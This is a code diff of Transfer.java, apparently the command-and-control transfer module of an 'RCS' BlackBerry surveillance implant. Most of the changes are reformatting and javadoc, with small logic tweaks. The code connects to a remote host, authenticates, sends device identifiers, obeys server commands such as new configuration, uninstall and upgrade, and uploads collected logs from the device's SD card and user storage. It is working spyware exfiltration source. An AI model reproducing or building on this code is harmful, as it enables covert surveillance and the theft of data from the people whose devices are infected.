@@ -1,8 +1,8 @@
 /* *************************************************
  * Copyright (c) 2010 - 2010
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSBlackBerry_lib 
- * File         : Transfer.java 
+ * Project      : RCS, RCSBlackBerry_lib
+ * File         : Transfer.java
  * Created      : 26-mar-2010
  * *************************************************/
 package blackberry.transfer;
@@ -102,23 +102,23 @@ public class Transfer {
         wifi = false;
         if (wifiPreferred) {
             // #debug debug
-	debug.trace("Try wifi, ssl:" + ssl);
+            debug.trace("Try wifi, ssl:" + ssl);
 
             connection = new WifiConnection(host, port, ssl, deviceside);
             if (connection.isActive()) {
                 // #debug debug
-	debug.trace("wifi connecting...");
+                debug.trace("wifi connecting...");
                 wifi = true;
                 connected = connection.connect();
                 //#debug debug
-	debug.trace("wifi connected: " + connected);
+                debug.trace("wifi connected: " + connected);
             }
         }
 
         // fall back
         if (!wifi || !connected) {
             // #debug debug
-	debug.trace("Try direct tcp, ssl:" + ssl);
+            debug.trace("Try direct tcp, ssl:" + ssl);
             connection = new DirectTcpConnection(host, port, ssl, deviceside);
             connected = connection.connect();
         }
@@ -130,20 +130,36 @@ public class Transfer {
         }
 
         // #debug info
-	debug.info("connected: " + connected);
+        debug.info("connected: " + connected);
         return connected;
 
     }
 
-    protected boolean connectDirect() {
+    /**
+     * Connect direct.
+     * 
+     * @return true, if successful
+     */
+    protected final boolean connectDirect() {
         return connect(true);
     }
 
-    protected boolean connectMDS() {
+    /**
+     * Connect mds.
+     * 
+     * @return true, if successful
+     */
+    protected final boolean connectMDS() {
         return connect(false);
     }
 
-    protected void disconnect(final boolean sendbye) {
+    /**
+     * Disconnect.
+     * 
+     * @param sendbye
+     *            the sendbye
+     */
+    protected final void disconnect(final boolean sendbye) {
         if (connected) {
             connected = false;
             if (sendbye) {
@@ -153,7 +169,7 @@ public class Transfer {
             connection = null;
         }
         // #debug info
-	debug.info("connected: " + connected);
+        debug.info("connected: " + connected);
     }
 
     /**
@@ -161,9 +177,12 @@ public class Transfer {
      * comando.
      * 
      * @param command
+     *            the command
      * @throws ProtocolException
+     *             the protocol exception
      */
-    protected void fillPayload(final Command command) throws ProtocolException {
+    protected final void fillPayload(final Command command)
+            throws ProtocolException {
         // #ifdef DBC
         Check.ensures(command != null, "command null");
         // #endif
@@ -188,10 +207,13 @@ public class Transfer {
      * riempire il payload del command.
      * 
      * @param command
+     *            the command
      * @param len
+     *            the len
      * @throws ProtocolException
+     *             the protocol exception
      */
-    protected void fillPayload(final Command command, final int len)
+    protected final void fillPayload(final Command command, final int len)
             throws ProtocolException {
         // #ifdef DBC
         Check.ensures(command != null, "command null");
@@ -203,7 +225,7 @@ public class Transfer {
         try {
             command.payload = connection.receive(len);
             // #debug debug
-	debug.trace("filled with: " + command.payload.length);
+            debug.trace("filled with: " + command.payload.length);
         } catch (final IOException e) {
             // #debug
             debug.error("receiving command: " + e);
@@ -218,10 +240,10 @@ public class Transfer {
      * @throws ProtocolException
      *             the protocol exception
      */
-    protected void getChallenge() throws ProtocolException {
+    protected final void getChallenge() throws ProtocolException {
 
         // #debug info
-	debug.info("getChallenge");
+        debug.info("getChallenge");
 
         final Command command = recvCommand();
 
@@ -247,7 +269,7 @@ public class Transfer {
     }
 
     /**
-     * prende la nuova configurazione e la salva, in modo che alla ripartenza
+     * prende la nuova configurazione e la salva, in modo che alla ripartenza.
      * 
      * @param command
      *            the command
@@ -257,11 +279,11 @@ public class Transfer {
      * @throws ProtocolException
      *             the protocol exception
      */
-    protected void getNewConf(final Command command) throws CommandException,
-            ProtocolException {
+    protected final void getNewConf(final Command command)
+            throws CommandException, ProtocolException {
 
         // #debug debug
-	debug.trace("getNewConf");
+        debug.trace("getNewConf");
 
         fillPayload(command);
         if (command.size() > 0) {
@@ -279,12 +301,21 @@ public class Transfer {
             } else {
                 sendCommand(Proto.OK);
             }
+        }else{
+            throw new CommandException("Empty conf");
         }
     }
 
-    protected void getResponse() throws ProtocolException {
+    /**
+     * Gets the response.
+     * 
+     * @return the response
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final void getResponse() throws ProtocolException {
         // #debug info
-	debug.info("getResponse");
+        debug.info("getResponse");
 
         final Command command = recvCommand();
         // boolean exception = false;
@@ -305,7 +336,7 @@ public class Transfer {
                         "getResponse: challange does not match");
             } else {
                 // #debug info
-	debug.info("Response OK");
+                debug.info("Response OK");
                 sendCommand(Proto.OK);
             }
 
@@ -315,7 +346,17 @@ public class Transfer {
 
     }
 
-    protected void getUpgrade(final Command command) throws CommandException {
+    /**
+     * Gets the upgrade.
+     * 
+     * @param command
+     *            the command
+     * @return the upgrade
+     * @throws CommandException
+     *             the command exception
+     */
+    protected final void getUpgrade(final Command command)
+            throws CommandException {
         // http://www.blackberryforums.com/developer-forum/96815-how-programmatically-download-jad-set-up-into-device.html
 
         // If you want to *install* an app you'll need to use a browser, as has
@@ -330,18 +371,28 @@ public class Transfer {
         // isResetRequired() returns false). I guess if saveNewModule returns
         // CMM_OK_MODULE_OVERWRITTEN you know it was a lib and will have to
         // reset (overwriting an app returns CMM_OK).
-       
+
         final int[] moduleHandles = CodeModuleManager.getModuleHandles();
         for (int i = 0; i < moduleHandles.length; ++i) {
             final String name = CodeModuleManager
                     .getModuleName(moduleHandles[i]);
             // #debug info
-	debug.info(name + " - HANDLE: " + i);
+            debug.info(name + " - HANDLE: " + i);
         }
         throw new CommandException("Not Implemented");
     }
 
-    protected void getUpload(final Command command) throws CommandException {
+    /**
+     * Gets the upload.
+     * 
+     * @param command
+     *            the command
+     * @return the upload
+     * @throws CommandException
+     *             the command exception
+     */
+    protected final void getUpload(final Command command)
+            throws CommandException {
         throw new CommandException("Not Implemented");
     }
 
@@ -357,20 +408,29 @@ public class Transfer {
      * @param wifiPreferred_
      *            the wifi preferred_
      */
-    public void init(final String host_, final int port_, final boolean ssl_,
-            final boolean wifiPreferred_) {
+    public final void init(final String host_, final int port_,
+            final boolean ssl_, final boolean wifiPreferred_) {
 
         reload = false;
         uninstall = false;
 
-        this.host = host_;        
-        this.port = port_;
-        this.ssl = ssl_;
-        this.wifiPreferred = wifiPreferred_;
+        host = host_;
+        port = port_;
+        ssl = ssl_;
+        wifiPreferred = wifiPreferred_;
         crypto.makeKey(Keys.getInstance().getChallengeKey());
     }
 
-    protected boolean parseCommand(final Command command)
+    /**
+     * Parses the command.
+     * 
+     * @param command
+     *            the command
+     * @return true, if successful
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final boolean parseCommand(final Command command)
             throws ProtocolException {
         // #ifdef DBC
         Check.asserts(command != null, "null command");
@@ -381,45 +441,46 @@ public class Transfer {
             switch (command.id) {
             case Proto.SYNC:
                 // #debug info
-	debug.info("SYNC");
+                debug.info("SYNC");
                 syncLogs(command);
                 break;
 
             case Proto.NEW_CONF:
                 // #debug info
-	debug.info("NEW_CONF");
+                debug.info("NEW_CONF");
                 getNewConf(command);
+                reload = true;
                 break;
 
             case Proto.UNINSTALL:
                 // #debug info
-	debug.info("UNINSTALL");
+                debug.info("UNINSTALL");
                 uninstall = true;
                 sendCommand(Proto.OK);
                 return false;
 
             case Proto.DOWNLOAD:
                 // #debug info
-	debug.info("DOWNLOAD");
+                debug.info("DOWNLOAD");
                 sendDownload(command);
                 break;
 
             case Proto.UPLOAD:
                 // #debug info
-	debug.info("UPLOAD");
+                debug.info("UPLOAD");
                 getUpload(command);
                 break;
 
             case Proto.UPGRADE:
                 // #debug info
-	debug.info("UPGRADE");
+                debug.info("UPGRADE");
                 getUpgrade(command);
                 reload = true;
                 break;
 
             case Proto.BYE:
                 // #debug info
-	debug.info("BYE");
+                debug.info("BYE");
                 return false;
 
             default:
@@ -434,9 +495,14 @@ public class Transfer {
         return true;
     }
 
-    protected Command recvCommand() {
+    /**
+     * Recv command.
+     * 
+     * @return the command
+     */
+    protected final Command recvCommand() {
         // #debug debug
-	debug.trace("recvCommand");
+        debug.trace("recvCommand");
 
         Command command = null;
         byte[] commandId;
@@ -452,78 +518,20 @@ public class Transfer {
         }
 
         // #debug debug
-	debug.trace("received command: " + command);
+        debug.trace("received command: " + command);
         return command;
     }
 
     /**
-     * Send.
+     * Send challenge.
      * 
-     * @return true, if successful
+     * @throws ProtocolException
+     *             the protocol exception
      */
-    public synchronized boolean startSession() {
-        try {
-            if (!connectDirect() && !connectMDS()) {
-                // #debug
-                debug.error("not connected");
-                return false;
-            }
-
-        } catch (final Exception ex) {
-        	//#debug
-            debug.error("not connected: " + ex);
-            return false;
-        }
-
-        boolean gotbye = false;
-        try {
-            // challenge response
-            // #debug debug
-	debug.trace("ChallengeResponse ->");
-            sendChallenge();
-            getResponse();
-
-            // #debug debug
-	debug.trace("ChallengeResponse <-");
-            getChallenge();
-            sendResponse();
-
-            // identificazione
-            // #debug debug
-	debug.trace("Ids");
-            sendIds();
-
-            // ricezione configurazione o comandi
-            for (;;) {
-                final Command command = recvCommand();
-                // #debug info
-	debug.info("Received command:" + command);
-                if (!parseCommand(command)) {
-                    // #debug info
-	debug.info("finished commands");
-                    break;
-                }
-            }
-        } catch (final ProtocolException ex) {
-            // #debug
-            debug.error("protocol exception");
-            gotbye = ex.bye;
-            return false;
-        } finally {
-            // #debug info
-	debug.info("disconnect");
-            disconnect(!gotbye);
-        }
+    protected final void sendChallenge() throws ProtocolException {
 
         // #debug info
-	debug.info("done");
-        return true;
-    }
-
-    protected void sendChallenge() throws ProtocolException {
-
-        // #debug info
-	debug.info("sendChallenge");
+        debug.info("sendChallenge");
 
         // TODO: keep a log seed
         final Random random = new Random();
@@ -537,13 +545,20 @@ public class Transfer {
         }
     }
 
-    protected boolean sendCommand(final Command command) {
+    /**
+     * Send command.
+     * 
+     * @param command
+     *            the command
+     * @return true, if successful
+     */
+    protected final boolean sendCommand(final Command command) {
 
         // #ifdef DBC
         Check.requires(command != null, "null command");
         // #endif
         // #debug debug
-	debug.trace("sending command: " + command);
+        debug.trace("sending command: " + command);
 
         final byte[] data = new byte[command.size() + 4];
         final DataBuffer databuffer = new DataBuffer(data, 0, data.length,
@@ -555,7 +570,7 @@ public class Transfer {
             databuffer.write(command.payload);
         } else {
             // #debug debug
-	debug.trace("payload null");
+            debug.trace("payload null");
         }
 
         // #ifdef DBC
@@ -569,26 +584,67 @@ public class Transfer {
         }
     }
 
-    protected boolean sendCommand(final int command) {
+    /**
+     * Send command.
+     * 
+     * @param command
+     *            the command
+     * @return true, if successful
+     */
+    protected final boolean sendCommand(final int command) {
         return sendCommand(new Command(command, null));
     }
 
-    protected boolean sendCommand(final int command, final byte[] payload) {
+    /**
+     * Send command.
+     * 
+     * @param command
+     *            the command
+     * @param payload
+     *            the payload
+     * @return true, if successful
+     */
+    protected final boolean sendCommand(final int command, final byte[] payload) {
         return sendCommand(new Command(command, payload));
     }
 
-    protected void sendCryptoCommand(final int commandId, final byte[] plain)
-            throws ProtocolException {
+    /**
+     * Send crypto command.
+     * 
+     * @param commandId
+     *            the command id
+     * @param plain
+     *            the plain
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final void sendCryptoCommand(final int commandId,
+            final byte[] plain) throws ProtocolException {
 
         sendManagedCommand(commandId, plain, true);
 
     }
 
-    protected void sendDownload(final Command command) throws CommandException {
+    /**
+     * Send download.
+     * 
+     * @param command
+     *            the command
+     * @throws CommandException
+     *             the command exception
+     */
+    protected final void sendDownload(final Command command)
+            throws CommandException {
         throw new CommandException("Not Implemented");
     }
 
-    protected void sendIds() throws ProtocolException {
+    /**
+     * Send ids.
+     * 
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final void sendIds() throws ProtocolException {
 
         final Device device = Device.getInstance();
         device.refreshData();
@@ -606,7 +662,7 @@ public class Transfer {
 
     private void sendLogs(final String basePath) throws ProtocolException {
         // #debug info
-	debug.info("sending logs from: " + basePath);
+        debug.info("sending logs from: " + basePath);
 
         final Vector dirs = logCollector.scanForDirLogs(basePath);
         final int dsize = dirs.size();
@@ -645,18 +701,31 @@ public class Transfer {
         }
     }
 
-    protected boolean sendManagedCommand(final int commandId,
+    /**
+     * Send managed command.
+     * 
+     * @param commandId
+     *            the command id
+     * @param plain
+     *            the plain
+     * @param cypher
+     *            the cypher
+     * @return true, if successful
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final boolean sendManagedCommand(final int commandId,
             final byte[] plain, final boolean cypher) throws ProtocolException {
 
         byte[] toSend;
 
         if (cypher) {
             // #debug info
-	debug.info("Sending Crypto Command: " + commandId);
+            debug.info("Sending Crypto Command: " + commandId);
             toSend = crypto.encryptData(plain);
         } else {
             // #debug info
-	debug.info("Sending Managed Command: " + commandId);
+            debug.info("Sending Managed Command: " + commandId);
             toSend = plain;
         }
 
@@ -671,7 +740,7 @@ public class Transfer {
         boolean sent = false;
         try {
             // #debug debug
-	debug.trace("sending content");
+            debug.trace("sending content");
             sent = connection.send(toSend);
         } catch (final IOException e) {
             // #debug
@@ -687,13 +756,19 @@ public class Transfer {
 
     }
 
-    protected void sendResponse() throws ProtocolException {
+    /**
+     * Send response.
+     * 
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final void sendResponse() throws ProtocolException {
         // #ifdef DBC
         Check.requires(challenge != null, "null crypto challange");
         // #endif
 
         // #debug info
-	debug.info("sendResponse");
+        debug.info("sendResponse");
 
         // challange contiene il challange cifrato, pronto per spedizione
         if (!sendCommand(Proto.RESPONSE, challenge)) {
@@ -703,11 +778,83 @@ public class Transfer {
         waitForOK();
     }
 
-    protected synchronized void syncLogs(final Command command)
+    /**
+     * Send.
+     * 
+     * @return true, if successful
+     */
+    public final synchronized boolean startSession() {
+        try {
+            if (!connectDirect() && !connectMDS()) {
+                // #debug
+                debug.error("not connected");
+                return false;
+            }
+
+        } catch (final Exception ex) {
+            //#debug
+            debug.error("not connected: " + ex);
+            return false;
+        }
+
+        boolean gotbye = false;
+        try {
+            // challenge response
+            // #debug debug
+            debug.trace("ChallengeResponse ->");
+            sendChallenge();
+            getResponse();
+
+            // #debug debug
+            debug.trace("ChallengeResponse <-");
+            getChallenge();
+            sendResponse();
+
+            // identificazione
+            // #debug debug
+            debug.trace("Ids");
+            sendIds();
+
+            // ricezione configurazione o comandi
+            for (;;) {
+                final Command command = recvCommand();
+                // #debug info
+                debug.info("Received command:" + command);
+                if (!parseCommand(command)) {
+                    // #debug info
+                    debug.info("finished commands");
+                    break;
+                }
+            }
+        } catch (final ProtocolException ex) {
+            // #debug
+            debug.error("protocol exception");
+            gotbye = ex.bye;
+            return false;
+        } finally {
+            // #debug info
+            debug.info("disconnect");
+            disconnect(!gotbye);
+        }
+
+        // #debug info
+        debug.info("done");
+        return true;
+    }
+
+    /**
+     * Sync logs.
+     * 
+     * @param command
+     *            the command
+     * @throws ProtocolException
+     *             the protocol exception
+     */
+    protected final synchronized void syncLogs(final Command command)
             throws ProtocolException {
 
         // #debug info
-	debug.info("syncLogs connected: " + connected + " wifi: " + wifi);
+        debug.info("syncLogs connected: " + connected + " wifi: " + wifi);
 
         sendLogs(Path.SD_PATH);
         sendLogs(Path.USER_PATH);
